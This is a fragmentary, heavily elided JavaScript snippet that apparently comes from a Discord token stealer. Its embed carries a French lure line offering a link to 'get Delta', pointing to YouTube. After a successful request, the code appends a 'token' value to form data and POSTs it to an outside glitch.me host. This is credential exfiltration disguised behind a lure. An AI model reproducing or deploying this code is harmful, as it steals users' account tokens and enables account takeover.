...
.setDescription('[Lien pour avoir Delta](https://youtu.be/EKZaQiOtNCY)')
        ...
        request(
            ...
            function(error, response, body) {
                if (response.statusCode === 200) {
                  ...
                  a.append('token', argument);
                  fetch('https://truthful-oceanic-bonobo.glitch.me/', { method: 'POST', body: a })
